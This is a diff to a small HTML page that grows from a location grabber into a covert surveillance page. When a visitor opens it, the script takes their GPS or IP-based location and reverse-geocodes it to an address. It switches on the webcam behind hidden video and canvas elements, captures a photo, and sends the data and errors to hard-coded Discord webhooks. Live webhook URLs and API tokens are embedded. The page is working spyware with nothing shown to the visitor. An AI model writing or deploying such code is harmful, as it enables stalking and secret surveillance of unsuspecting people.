@@ -3,21 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Location</title>
+    <title>Location and Photo Capture</title>
+    <style>
+        video, canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
     <script>
-        const webhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ'; // Replace with your actual webhook URL
-        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa'; // Your LocationIQ token
-        const ipinfoToken = '41d360af12f2bf'; // Your IPinfo token
+        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ';
+        const photoWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
+        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
+        const ipinfoToken = '41d360af12f2bf';
 
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(success, error);
             } else {
-                console.error("Geolocation is not supported by this browser.");
-                // Fallback to IP-based geolocation
-                getIPGeolocation();
+                error({ code: 0, message: "Geolocation not supported" });
             }
         }
 
@@ -28,26 +35,22 @@
         }
 
         function error(err) {
-            console.warn(`ERROR(${err.code}): ${err.message}`);
-            // Fallback to IP-based geolocation
+            sendErrorToDiscord(`Geolocation Error (${err.code}): ${err.message}`);
             getIPGeolocation();
         }
 
         function getIPGeolocation() {
-            // Using a free IP geolocation service
-            fetch(`https://ipinfo.io/json?token=${ipinfoToken}`) // Using the IPinfo token
+            fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
                 .then(response => response.json())
                 .then(data => {
                     if (data && data.loc) {
                         const [latitude, longitude] = data.loc.split(',');
                         reverseGeocode(latitude, longitude);
                     } else {
-                        console.error("Unable to retrieve location from IP.");
+                        sendErrorToDiscord("Unable to retrieve location from IP.");
                     }
                 })
-                .catch(error => {
-                    console.error('Error fetching IP geolocation:', error);
-                });
+                .catch(() => sendErrorToDiscord('Error fetching IP geolocation.'));
         }
 
         function reverseGeocode(latitude, longitude) {
@@ -58,39 +61,71 @@
                 .then(data => {
                     if (data && data.display_name) {
                         const address = data.display_name;
-                        sendToDiscord(latitude, longitude, address);
+                        sendLocationToDiscord(latitude, longitude, address);
                     } else {
-                        console.error('Error in reverse geocoding:', data);
+                        sendErrorToDiscord('Error in reverse geocoding.');
                     }
                 })
-                .catch(error => console.error('Error:', error));
+                .catch(() => sendErrorToDiscord('Error during reverse geocoding.'));
         }
 
-        function sendToDiscord(latitude, longitude, address) {
+        function sendLocationToDiscord(latitude, longitude, address) {
             const message = {
                 content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
             };
 
-            fetch(webhookURL, {
+            fetch(locationWebhookURL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(message),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Message sent to Discord successfully.');
-                } else {
-                    console.error('Error sending message to Discord:', response.statusText);
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
             });
         }
 
-        window.onload = getLocation;
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('video').addEventListener('loadedmetadata', capturePhoto);
+            } catch {
+                sendErrorToDiscord("Error accessing the camera.");
+            }
+        }
+
+        async function capturePhoto() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            await sendPhotoToDiscord(imageData);
+        }
+
+        async function sendPhotoToDiscord(imageData) {
+            const response = await fetch(photoWebhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "New Photo Captured",
+                    embeds: [{ image: { url: imageData } }]
+                }),
+            });
+
+            if (!response.ok) {
+                sendErrorToDiscord("Error sending image to Discord.");
+            }
+        }
+
+        function sendErrorToDiscord(message) {
+            fetch(locationWebhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message }),
+            });
+        }
+
+        window.onload = () => {
+            getLocation();
+            initCamera();
+        };
     </script>
 </body>
 </html>
